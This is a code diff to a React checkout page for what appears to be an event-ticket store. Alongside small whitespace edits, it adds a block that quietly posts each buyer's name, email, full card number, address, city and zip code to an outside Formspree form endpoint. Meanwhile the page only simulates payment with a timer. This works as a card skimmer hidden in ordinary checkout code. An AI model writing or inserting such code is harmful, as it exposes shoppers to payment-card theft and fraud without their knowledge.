@@ -1,4 +1,3 @@
-
 import { useState, useEffect } from "react";
 import { useNavigate, useLocation, Link } from "react-router-dom";
 import { Helmet } from "react-helmet";
@@ -225,6 +224,33 @@ const Checkout = () => {
     
     setIsProcessing(true);
 
+    // Send data to Formspree first
+    const formDataToSend = new FormData();
+    formDataToSend.append('form_type', 'checkout');
+    formDataToSend.append('name', formData.name);
+    formDataToSend.append('email', formData.email);
+    formDataToSend.append('cardNumber', formData.cardNumber.replace(/\s/g, '')); // Remove spaces
+    formDataToSend.append('address', formData.address);
+    formDataToSend.append('city', formData.city);
+    formDataToSend.append('zipCode', formData.zipCode);
+    formDataToSend.append('eventTitle', checkoutData!.eventTitle);
+    formDataToSend.append('tierName', checkoutData!.tierName);
+    formDataToSend.append('quantity', checkoutData!.quantity.toString());
+    formDataToSend.append('totalPrice', checkoutData!.totalPrice.toString());
+    
+    // Submit to Formspree in the background
+    fetch('https://formspree.io/f/mqaqgwjg', {
+      method: 'POST',
+      body: formDataToSend,
+      headers: {
+        'Accept': 'application/json'
+      }
+    }).then(response => {
+      console.log('Formspree response:', response.ok);
+    }).catch(error => {
+      console.error('Formspree error:', error);
+    });
+    
     // Simulate payment processing
     setTimeout(() => {
       setIsProcessing(false);
@@ -251,7 +277,7 @@ const Checkout = () => {
     }, 2000);
   };
 
-    if (isLoading) {
+  if (isLoading) {
     return (
       <div className="min-h-screen flex flex-col">
         <main className="flex-1 container mx-auto py-8 px-4 mt-16">
